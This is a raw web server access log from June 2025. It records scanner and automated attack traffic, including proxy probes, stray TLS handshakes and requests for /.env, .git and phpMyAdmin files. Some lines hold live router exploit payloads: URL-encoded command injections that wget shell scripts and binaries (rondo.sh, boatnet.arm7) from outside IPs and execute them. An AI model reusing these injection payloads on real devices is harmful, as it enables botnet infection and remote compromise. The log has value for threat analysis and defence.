199.204.97.58 - - [21/Jun/2025:17:39:15 +0000] "GET http://httpbin.org/get HTTP/1.1" 500 6864 "-" "Go-http-client/1.1"
204.76.203.219 - - [21/Jun/2025:17:46:37 +0000] "GET / HTTP/1.1" 500 6870 "-" "curl/7.81.0"
199.204.97.58 - - [21/Jun/2025:17:52:42 +0000] "GET http://httpbin.org/get HTTP/1.1" 500 6864 "-" "Go-http-client/1.1"
199.204.97.58 - - [21/Jun/2025:18:06:13 +0000] "GET http://httpbin.org/get HTTP/1.1" 500 6864 "-" "Go-http-client/1.1"
204.76.203.219 - - [21/Jun/2025:18:12:46 +0000] "GET / HTTP/1.1" 500 6864 "-" "curl/7.81.0"
199.204.97.58 - - [21/Jun/2025:18:19:42 +0000] "GET http://httpbin.org/get HTTP/1.1" 500 6864 "-" "Go-http-client/1.1"
79.124.49.202 - - [21/Jun/2025:18:20:59 +0000] "\x03\x00\x00/*\xE0\x00\x00\x00\x00\x00Cookie: mstshash=Administr" 400 157 "-" "-"
113.215.189.27 - - [21/Jun/2025:18:27:27 +0000] "\x16\x03\x03\x01\x02\x01\x00\x00\xFE\x03\x03\xE2x\xF8#N\x7F\xF4\xFCGt{7\xE1\x9F\xB1\xE4J\xB1N\xAD\xFD;" 400 157 "-" "-"
149.50.103.48 - - [21/Jun/2025:18:31:59 +0000] "GET / HTTP/1.1" 500 6864 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
199.204.97.58 - - [21/Jun/2025:18:33:16 +0000] "GET http://httpbin.org/get HTTP/1.1" 500 6864 "-" "Go-http-client/1.1"
45.135.194.34 - - [21/Jun/2025:18:35:28 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=%24%28killall%20-9%20mipsel%20mpsl%3B%28wget%20-O-%20http%3A%2F%2F14.103.145.202%2Frondo.sh%7C%7Cbusybox%20wget%20-O-%20http%3A%2F%2F14.103.145.202%2Frondo.sh%29%20%7C%20sh%20-s%20tplink%3B%29 HTTP/1.1" 499 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36"
113.215.188.17 - - [21/Jun/2025:18:37:44 +0000] "\x16\x03\x03\x01\x02\x01\x00\x00\xFE\x03\x03\xCF\xF7\xB0\xB3`tc\x84\xBF&\xBB\xA9\xD7\xA1\x03V\x8ET4\xBD\x8BI|\x17\xB6]\x13tK@\xD7\x90\x00\x00V\xC0,\xC0+\xC00\xC0/\x00\x9F\x00\xA3\x00\x9E\x00\xA2\xC0$\xC0(\xC0#\xC0'\x00k\x00j\x00g\x00@\xC0.\xC02\xC0-\xC01\xC0&\xC0*\xC0%\xC0)\xC0" 400 157 "-" "-"
199.204.97.58 - - [21/Jun/2025:18:46:42 +0000] "GET http://httpbin.org/get HTTP/1.1" 500 6870 "-" "Go-http-client/1.1"
204.76.203.219 - - [21/Jun/2025:18:51:39 +0000] "GET / HTTP/1.1" 500 6870 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
176.65.148.75 - - [21/Jun/2025:18:51:55 +0000] "GET / HTTP/1.1" 500 6864 "-" "-"
204.76.203.219 - - [21/Jun/2025:18:58:10 +0000] "GET / HTTP/1.1" 500 6864 "-" "curl/7.81.0"
199.204.97.58 - - [21/Jun/2025:19:00:12 +0000] "GET http://httpbin.org/get HTTP/1.1" 500 6864 "-" "Go-http-client/1.1"
199.204.97.58 - - [21/Jun/2025:19:13:42 +0000] "GET http://httpbin.org/get HTTP/1.1" 500 6864 "-" "Go-http-client/1.1"
199.204.97.58 - - [21/Jun/2025:19:27:13 +0000] "GET http://httpbin.org/get HTTP/1.1" 500 6870 "-" "Go-http-client/1.1"
149.50.103.48 - - [21/Jun/2025:19:31:46 +0000] "GET / HTTP/1.1" 500 6864 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
204.76.203.219 - - [21/Jun/2025:19:32:39 +0000] "GET / HTTP/1.1" 500 6870 "-" "curl/7.81.0"
199.204.97.58 - - [21/Jun/2025:19:40:42 +0000] "GET http://httpbin.org/get HTTP/1.1" 500 6864 "-" "Go-http-client/1.1"
179.43.191.98 - - [21/Jun/2025:19:40:59 +0000] "GET / HTTP/1.1" 500 6864 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36"
198.235.24.10 - - [21/Jun/2025:19:49:02 +0000] "GET / HTTP/1.0" 500 6851 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
199.204.97.58 - - [21/Jun/2025:19:54:13 +0000] "GET http://httpbin.org/get HTTP/1.1" 500 6864 "-" "Go-http-client/1.1"
5.183.209.244 - - [21/Jun/2025:19:55:16 +0000] "GET / HTTP/1.1" 500 6870 "-" "-"
134.209.236.98 - - [21/Jun/2025:20:01:37 +0000] "\x16\x03\x01\x01$\x01\x00\x01 \x03\x03^\x87pu\xB3\x04\xFE\xB4\x08\xAD\xC7d\xA0\x89\xA7\x15\x8D\xC4\x87\x16\xDB\xA3\x9C\xE4;|\x8C\xA1\x8Cz/\xB2 \xA7\x19" 400 157 "-" "-"
204.76.203.219 - - [21/Jun/2025:20:02:55 +0000] "GET / HTTP/1.1" 500 6870 "-" "curl/7.81.0"
199.204.97.58 - - [21/Jun/2025:20:07:42 +0000] "GET http://httpbin.org/get HTTP/1.1" 500 6864 "-" "Go-http-client/1.1"
45.135.193.65 - - [21/Jun/2025:20:10:03 +0000] "GET /.env HTTP/1.1" 500 6870 "-" "Mozilla/5.0 (X11; Linux i686 on x86_64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1"
112.94.96.148 - - [21/Jun/2025:20:19:49 +0000] "POST /GponForm/diag_Form?images/ HTTP/1.1" 500 6864 "-" "Hello, World"
112.94.96.148 - - [21/Jun/2025:20:19:49 +0000] "/tmp/gpon80&ipv=0" 400 157 "-" "-"
199.204.97.58 - - [21/Jun/2025:20:21:13 +0000] "GET http://httpbin.org/get HTTP/1.1" 500 6870 "-" "Go-http-client/1.1"
204.76.203.219 - - [21/Jun/2025:20:32:28 +0000] "GET / HTTP/1.1" 500 6864 "-" "curl/7.81.0"
176.65.148.75 - - [21/Jun/2025:20:34:18 +0000] "GET / HTTP/1.1" 500 6870 "-" "-"
149.50.103.48 - - [21/Jun/2025:20:34:40 +0000] "GET / HTTP/1.1" 500 6870 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
199.204.97.58 - - [21/Jun/2025:20:34:42 +0000] "GET http://httpbin.org/get HTTP/1.1" 500 6870 "-" "Go-http-client/1.1"
205.210.31.43 - - [21/Jun/2025:20:43:05 +0000] "GET / HTTP/1.0" 500 6851 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
199.204.97.58 - - [21/Jun/2025:20:48:13 +0000] "GET http://httpbin.org/get HTTP/1.1" 500 6864 "-" "Go-http-client/1.1"
87.255.194.135 - - [21/Jun/2025:20:49:34 +0000] "GET /admin/configs.php HTTP/1.0" 404 16 "-" "xfa1"
204.76.203.219 - - [21/Jun/2025:20:51:20 +0000] "GET / HTTP/1.1" 500 6870 "-" "curl/7.81.0"
199.204.97.58 - - [21/Jun/2025:21:01:42 +0000] "GET http://httpbin.org/get HTTP/1.1" 500 6870 "-" "Go-http-client/1.1"
5.183.209.244 - - [21/Jun/2025:21:07:42 +0000] "GET / HTTP/1.1" 500 6870 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
204.76.203.219 - - [21/Jun/2025:21:09:48 +0000] "GET / HTTP/1.1" 500 6864 "-" "curl/7.81.0"
199.204.97.58 - - [21/Jun/2025:21:15:13 +0000] "GET http://httpbin.org/get HTTP/1.1" 500 6870 "-" "Go-http-client/1.1"
201.7.170.246 - - [21/Jun/2025:21:24:16 +0000] "GET /admin/config.php HTTP/1.0" 404 16 "-" "xfa1"
199.204.97.58 - - [21/Jun/2025:21:28:43 +0000] "GET http://httpbin.org/get HTTP/1.1" 500 6864 "-" "Go-http-client/1.1"
204.76.203.219 - - [21/Jun/2025:21:30:55 +0000] "GET / HTTP/1.1" 500 6870 "-" "curl/7.81.0"
199.204.97.58 - - [21/Jun/2025:21:43:23 +0000] "GET http://httpbin.org/get HTTP/1.1" 500 6870 "-" "Go-http-client/1.1"
149.50.103.48 - - [21/Jun/2025:21:45:37 +0000] "GET / HTTP/1.1" 500 6870 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
204.76.203.219 - - [21/Jun/2025:21:55:14 +0000] "GET / HTTP/1.1" 500 6864 "-" "curl/7.81.0"
199.204.97.58 - - [21/Jun/2025:21:58:26 +0000] "GET http://httpbin.org/get HTTP/1.1" 500 6870 "-" "Go-http-client/1.1"
204.76.203.219 - - [21/Jun/2025:22:08:27 +0000] "GET / HTTP/1.1" 500 6864 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
204.76.203.219 - - [21/Jun/2025:22:16:17 +0000] "GET / HTTP/1.1" 500 6870 "-" "curl/7.81.0"
89.248.164.165 - - [21/Jun/2025:22:24:23 +0000] "GET http://pingjs.qq.com/ping.js HTTP/1.1" 500 6870 "-" "Mozilla"
199.204.97.58 - - [21/Jun/2025:22:28:50 +0000] "GET http://httpbin.org/get HTTP/1.1" 500 6870 "-" "Go-http-client/1.1"
89.42.231.140 - - [21/Jun/2025:22:29:27 +0000] "GET / HTTP/1.1" 500 6864 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
204.76.203.219 - - [21/Jun/2025:22:39:54 +0000] "GET / HTTP/1.1" 500 6864 "-" "curl/7.81.0"
199.204.97.58 - - [21/Jun/2025:22:42:18 +0000] "GET http://httpbin.org/get HTTP/1.1" 500 6870 "-" "Go-http-client/1.1"
114.119.144.85 - - [21/Jun/2025:22:43:55 +0000] "GET /robots.txt HTTP/1.1" 200 24 "-" "Mozilla/5.0 (compatible;PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
149.50.103.48 - - [21/Jun/2025:22:47:24 +0000] "GET / HTTP/1.1" 500 6864 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
199.204.97.58 - - [21/Jun/2025:22:55:48 +0000] "GET http://httpbin.org/get HTTP/1.1" 500 6864 "-" "Go-http-client/1.1"
204.76.203.219 - - [21/Jun/2025:23:03:59 +0000] "GET / HTTP/1.1" 500 6870 "-" "curl/7.81.0"
141.255.162.250 - - [21/Jun/2025:23:07:40 +0000] "GET / HTTP/1.1" 500 6864 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
199.204.97.58 - - [21/Jun/2025:23:09:18 +0000] "GET http://httpbin.org/get HTTP/1.1" 500 6864 "-" "Go-http-client/1.1"
204.76.203.219 - - [21/Jun/2025:23:19:58 +0000] "GET / HTTP/1.1" 500 6870 "-" "curl/7.81.0"
199.204.97.58 - - [21/Jun/2025:23:22:51 +0000] "GET http://httpbin.org/get HTTP/1.1" 500 6864 "-" "Go-http-client/1.1"
196.251.70.87 - - [21/Jun/2025:23:25:50 +0000] "GET /.git/refs/ HTTP/1.1" 500 6864 "-" "Mozilla/5.0 (Linux; U; Android 1.6; en-us; HTC_TATTOO_A3288 Build/DRC79) AppleWebKit/528.5  (KHTML, like Gecko) Version/3.1.2 Mobile Safari/525.20.1"
162.216.149.10 - - [21/Jun/2025:23:29:51 +0000] "GET / HTTP/1.1" 500 6870 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
199.204.97.58 - - [21/Jun/2025:23:36:20 +0000] "GET http://httpbin.org/get HTTP/1.1" 500 6864 "-" "Go-http-client/1.1"
204.76.203.219 - - [21/Jun/2025:23:41:22 +0000] "GET / HTTP/1.1" 500 6864 "-" "curl/7.81.0"
199.204.97.58 - - [21/Jun/2025:23:49:48 +0000] "GET http://httpbin.org/get HTTP/1.1" 500 6864 "-" "Go-http-client/1.1"
149.50.103.48 - - [21/Jun/2025:23:53:51 +0000] "GET / HTTP/1.1" 500 6870 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
176.65.148.75 - - [21/Jun/2025:23:57:39 +0000] "GET / HTTP/1.1" 500 6864 "-" "-"
198.235.24.2 - - [21/Jun/2025:23:58:54 +0000] "GET / HTTP/1.1" 500 6864 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
204.76.203.219 - - [22/Jun/2025:00:03:07 +0000] "GET / HTTP/1.1" 500 6870 "-" "curl/7.81.0"
199.204.97.58 - - [22/Jun/2025:00:03:18 +0000] "GET http://httpbin.org/get HTTP/1.1" 500 6870 "-" "Go-http-client/1.1"
176.65.148.234 - - [22/Jun/2025:00:10:49 +0000] "GET / HTTP/1.1" 500 6870 "-" "-"
80.82.77.202 - - [22/Jun/2025:00:13:15 +0000] "\x16\x03\x02\x01o\x01\x00\x01k\x03\x02RH\xC5\x1A#\xF7:N\xDF\xE2\xB4\x82/\xFF\x09T\x9F\xA7\xC4y\xB0h\xC6\x13\x8C\xA4\x1C=\x22\xE1\x1A\x98 \x84\xB4,\x85\xAFn\xE3Y\xBBbhl\xFF(=':\xA9\x82\xD9o\xC8\xA2\xD7\x93\x98\xB4\xEF\x80\xE5\xB9\x90\x00(\xC0" 400 157 "-" "-"
199.204.97.58 - - [22/Jun/2025:00:16:48 +0000] "GET http://httpbin.org/get HTTP/1.1" 500 6864 "-" "Go-http-client/1.1"
144.172.91.16 - - [22/Jun/2025:00:23:06 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 500 6864 "http://118.31.36.181:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
144.172.91.16 - - [22/Jun/2025:00:23:07 +0000] "" 400 0 "-" "-"
204.76.203.219 - - [22/Jun/2025:00:25:00 +0000] "GET / HTTP/1.1" 500 6870 "-" "curl/7.81.0"
176.65.148.75 - - [22/Jun/2025:00:26:17 +0000] "GET / HTTP/1.1" 500 6864 "-" "-"
199.204.97.58 - - [22/Jun/2025:00:30:25 +0000] "GET http://httpbin.org/get HTTP/1.1" 500 6864 "-" "Go-http-client/1.1"
128.203.200.235 - - [22/Jun/2025:00:32:44 +0000] "GET / HTTP/1.1" 500 6864 "-" "Mozilla/5.0 zgrab/0.x"
204.76.203.219 - - [22/Jun/2025:00:42:10 +0000] "GET / HTTP/1.1" 500 6864 "-" "curl/7.81.0"
199.204.97.58 - - [22/Jun/2025:00:43:48 +0000] "GET http://httpbin.org/get HTTP/1.1" 500 6864 "-" "Go-http-client/1.1"
142.93.4.137 - - [22/Jun/2025:00:51:17 +0000] "\x00\x0E8\x17i\xC6\xB8\x90\x0F\xA5\xC1\x00\x00\x00\x00\x00" 400 157 "-" "-"
149.50.103.48 - - [22/Jun/2025:00:53:13 +0000] "GET / HTTP/1.1" 500 6864 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
199.204.97.58 - - [22/Jun/2025:00:57:19 +0000] "GET http://httpbin.org/get HTTP/1.1" 500 6864 "-" "Go-http-client/1.1"
204.76.203.219 - - [22/Jun/2025:01:03:04 +0000] "GET / HTTP/1.1" 500 6864 "-" "curl/7.81.0"
204.76.203.219 - - [22/Jun/2025:01:10:26 +0000] "GET / HTTP/1.1" 500 6870 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
199.204.97.58 - - [22/Jun/2025:01:10:48 +0000] "GET http://httpbin.org/get HTTP/1.1" 500 6864 "-" "Go-http-client/1.1"
89.42.231.140 - - [22/Jun/2025:01:19:34 +0000] "GET / HTTP/1.1" 500 6870 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
199.204.97.58 - - [22/Jun/2025:01:24:18 +0000] "GET http://httpbin.org/get HTTP/1.1" 500 6864 "-" "Go-http-client/1.1"
185.242.226.12 - - [22/Jun/2025:01:28:16 +0000] "\x16\x03\x01\x00\x8B\x01\x00\x00\x87\x03\x03y\x08\xCA\x0Fe\xA5&~\x93b~n\xE5R\xB2\xEA\xCBW\x0C\x0B\xAEz\x99b\x99\x89\x04J\xD5Mw\xF2\x00\x00\x1A\xC0/\xC0+\xC0\x11\xC0\x07\xC0\x13\xC0\x09\xC0\x14\xC0" 400 157 "-" "-"
204.76.203.219 - - [22/Jun/2025:01:33:38 +0000] "GET / HTTP/1.1" 500 6864 "-" "curl/7.81.0"
199.204.97.58 - - [22/Jun/2025:01:37:48 +0000] "GET http://httpbin.org/get HTTP/1.1" 500 6870 "-" "Go-http-client/1.1"
5.183.209.244 - - [22/Jun/2025:01:43:54 +0000] "GET / HTTP/1.1" 500 6870 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
199.204.97.58 - - [22/Jun/2025:01:51:18 +0000] "GET http://httpbin.org/get HTTP/1.1" 500 6870 "-" "Go-http-client/1.1"
204.76.203.219 - - [22/Jun/2025:01:53:52 +0000] "GET / HTTP/1.1" 500 6870 "-" "curl/7.81.0"
149.50.103.48 - - [22/Jun/2025:01:58:20 +0000] "GET / HTTP/1.1" 500 6864 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
87.255.194.135 - - [22/Jun/2025:02:00:32 +0000] "GET /admin/assets/css/jquery-ui.css HTTP/1.0" 500 6851 "-" "xfa1"
199.204.97.58 - - [22/Jun/2025:02:04:49 +0000] "GET http://httpbin.org/get HTTP/1.1" 500 6864 "-" "Go-http-client/1.1"
204.76.203.219 - - [22/Jun/2025:02:10:17 +0000] "GET / HTTP/1.1" 500 6870 "-" "curl/7.81.0"
199.204.97.58 - - [22/Jun/2025:02:18:18 +0000] "GET http://httpbin.org/get HTTP/1.1" 500 6864 "-" "Go-http-client/1.1"
199.204.97.58 - - [22/Jun/2025:02:31:48 +0000] "GET http://httpbin.org/get HTTP/1.1" 500 6870 "-" "Go-http-client/1.1"
89.42.231.140 - - [22/Jun/2025:02:32:22 +0000] "GET / HTTP/1.1" 500 6870 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
204.76.203.219 - - [22/Jun/2025:02:33:24 +0000] "GET / HTTP/1.1" 500 6870 "-" "curl/7.81.0"
170.106.35.187 - - [22/Jun/2025:02:44:06 +0000] "GET / HTTP/1.1" 500 6864 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1"
199.204.97.58 - - [22/Jun/2025:02:45:18 +0000] "GET http://httpbin.org/get HTTP/1.1" 500 6864 "-" "Go-http-client/1.1"
204.76.203.219 - - [22/Jun/2025:02:55:08 +0000] "GET / HTTP/1.1" 500 6870 "-" "curl/7.81.0"
199.204.97.58 - - [22/Jun/2025:02:58:48 +0000] "GET http://httpbin.org/get HTTP/1.1" 500 6870 "-" "Go-http-client/1.1"
149.50.103.48 - - [22/Jun/2025:03:05:14 +0000] "GET / HTTP/1.1" 500 6870 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
199.204.97.58 - - [22/Jun/2025:03:12:18 +0000] "GET http://httpbin.org/get HTTP/1.1" 500 6870 "-" "Go-http-client/1.1"
204.76.203.219 - - [22/Jun/2025:03:13:24 +0000] "GET / HTTP/1.1" 500 6864 "-" "curl/7.81.0"
144.172.112.208 - - [22/Jun/2025:03:13:45 +0000] "POST /device.rsp?opt=sys&cmd=___S_O_S_T_R_E_A_MAX___&mdb=sos&mdc=cd%20%2Ftmp%3Brm%20boatnet.arm7%3B%20wget%20http%3A%2F%2F160.187.246.32%2Fhiddenbin%2Fboatnet.arm7%3B%20chmod%20777%20%2A%3B%20.%2Fboatnet.arm7%20tbk HTTP/1.1" 500 6864 "-" "Mozilla/5.0"
47.106.187.235 - - [22/Jun/2025:03:14:04 +0000] "HEAD /phpMyAdmin-2.11.4/scripts/setup.php HTTP/1.1" 404 0 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
47.106.187.235 - - [22/Jun/2025:03:14:12 +0000] "HEAD /web/phpMyAdmin/scripts/setup.php HTTP/1.1" 499 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.120 Safari/537.36 Edg/109.0.1518.61"
199.204.97.58 - - [22/Jun/2025:03:25:49 +0000] "GET http://httpbin.org/get HTTP/1.1" 500 6870 "-" "Go-http-client/1.1"
204.76.203.219 - - [22/Jun/2025:03:35:15 +0000] "GET / HTTP/1.1" 500 6870 "-" "curl/7.81.0"
199.204.97.58 - - [22/Jun/2025:03:39:19 +0000] "GET http://httpbin.org/get HTTP/1.1" 500 6870 "-" "Go-http-client/1.1"
205.210.31.100 - - [22/Jun/2025:03:39:59 +0000] "\x16\x03\x01\x00\xCA\x01\x00\x00\xC6\x03\x03u\xA3\x22y\xB2\x90\x8DM\x0F\xBE\xA5\x0C\x08\x89\xBB) \x87\xC1\x1C \x91\x98\xA0/i\xDE\x11N3\x06\x84\x00\x00h\xCC\x14\xCC\x13\xC0/\xC0+\xC00\xC0,\xC0\x11\xC0\x07\xC0'\xC0#\xC0\x13\xC0\x09\xC0(\xC0$\xC0\x14\xC0" 400 157 "-" "-"
205.210.31.100 - - [22/Jun/2025:03:39:59 +0000] "\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03\xDFs\xCC\xF9\xC3\x08\x80=(\xAC>M|\xCAi/\xF5\xF2]\x1Al\xA1\x99\xEC\xCA\xCF\x05J\x9E:\x9B' \xA6\x9C\x85\x8F\xFB\x91\x02E8G\xC6\xA5O\x1D\xED\xB1`\x7F\xB8w\x8A\x22\xE2\x09\x1Ai|\xB7N\x9D\xAD\xE3\x00&\xC0+\xC0/\xC0,\xC00\xCC\xA9\xCC\xA8\xC0\x09\xC0\x13\xC0" 400 157 "-" "-"
89.42.231.140 - - [22/Jun/2025:03:44:38 +0000] "GET / HTTP/1.1" 500 6864 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
199.204.97.58 - - [22/Jun/2025:03:52:48 +0000] "GET http://httpbin.org/get HTTP/1.1" 500 6864 "-" "Go-http-client/1.1"
79.124.49.202 - - [22/Jun/2025:03:54:41 +0000] "\x03\x00\x00/*\xE0\x00\x00\x00\x00\x00Cookie: mstshash=Administr" 400 157 "-" "-"
204.76.203.219 - - [22/Jun/2025:03:54:58 +0000] "GET / HTTP/1.1" 500 6870 "-" "curl/7.81.0"
199.204.97.58 - - [22/Jun/2025:04:06:18 +0000] "GET http://httpbin.org/get HTTP/1.1" 500 6864 "-" "Go-http-client/1.1"
204.76.203.219 - - [22/Jun/2025:04:09:52 +0000] "GET / HTTP/1.1" 500 6864 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
149.50.103.48 - - [22/Jun/2025:04:11:57 +0000] "GET / HTTP/1.1" 500 6864 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
199.204.97.58 - - [22/Jun/2025:04:19:48 +0000] "GET http://httpbin.org/get HTTP/1.1" 500 6870 "-" "Go-http-client/1.1"
204.76.203.219 - - [22/Jun/2025:04:22:49 +0000] "GET / HTTP/1.1" 500 6864 "-" "curl/7.81.0"
134.199.149.218 - - [22/Jun/2025:04:24:46 +0000] "GET /.git/config HTTP/1.1" 500 6864 "-" "Mozilla/5.0; Keydrop.io/1.0(onlyscans.com/about);"
134.199.149.218 - - [22/Jun/2025:04:24:47 +0000] "GET /.env HTTP/1.1" 500 6864 "-" "Mozilla/5.0; Keydrop.io/1.0(onlyscans.com/about);"
199.204.97.58 - - [22/Jun/2025:04:33:18 +0000] "GET http://httpbin.org/get HTTP/1.1" 500 6870 "-" "Go-http-client/1.1"
94.102.56.99 - - [22/Jun/2025:04:39:59 +0000] "GET /favicon.ico HTTP/1.1" 200 1150 "-" "Mozilla/5.0 zgrab/0.x"
199.204.97.58 - - [22/Jun/2025:04:46:48 +0000] "GET http://httpbin.org/get HTTP/1.1" 500 6864 "-" "Go-http-client/1.1"
204.76.203.219 - - [22/Jun/2025:04:47:20 +0000] "GET / HTTP/1.1" 500 6864 "-" "curl/7.81.0"
45.55.46.233 - - [22/Jun/2025:04:58:48 +0000] "GET /favicon.ico HTTP/1.1" 200 1150 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
45.55.46.233 - - [22/Jun/2025:04:58:48 +0000] "GET /1.php HTTP/1.1" 404 27 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
45.55.46.233 - - [22/Jun/2025:04:58:49 +0000] "GET /systembc/password.php HTTP/1.1" 404 27 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
45.55.46.233 - - [22/Jun/2025:04:58:49 +0000] "GET /password.php HTTP/1.1" 404 27 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
45.55.46.233 - - [22/Jun/2025:04:58:50 +0000] "\x16\x03\x01\x00u\x01\x00\x00q\x03\x03y\xCCe2H\xD9\xB4\xB5\xC1\xF0\x9C\x11+rz\x1B|\x83.\x806x\x15\x5C\xEF\x9Cq\x9A\xE4x&\xAD\x00\x00\x1A\xC0/\xC0+\xC0\x11\xC0\x07\xC0\x13\xC0\x09\xC0\x14\xC0" 400 157 "-" "-"
45.55.46.233 - - [22/Jun/2025:04:58:50 +0000] "GET /form.html HTTP/1.1" 500 6870 "-" "curl/8.1.2"
45.55.46.233 - - [22/Jun/2025:04:58:51 +0000] "GET /upl.php HTTP/1.1" 404 27 "-" "Mozilla/5.0"
45.55.46.233 - - [22/Jun/2025:04:58:52 +0000] "\x16\x03\x01\x00u\x01\x00\x00q\x03\x03\x9D#\xC0!9\xDC2\xBEN\xE2t\xF1\x86\x5C\xFA\x9D\xEE:@\x95zK\x90\xDD!D\x96\x14\x9Eb\xF9\xFD\x00\x00\x1A\xC0/\xC0+\xC0\x11\xC0\x07\xC0\x13\xC0\x09\xC0\x14\xC0" 400 157 "-" "-"
45.55.46.233 - - [22/Jun/2025:04:58:52 +0000] "\x16\x03\x01\x00u\x01\x00\x00q\x03\x03\xC5\xE3\x86\x9E\xB6\xEA\x82?3\xCDR\xE2\x8F\xCD/\xB6\xD3Y\xD8\xA8\xBA\xC5{\x00Y\x94\x11;8\xFD\xE3U\x00\x00\x1A\xC0/\xC0+\xC0\x11\xC0\x07\xC0\x13\xC0\x09\xC0\x14\xC0" 400 157 "-" "-"
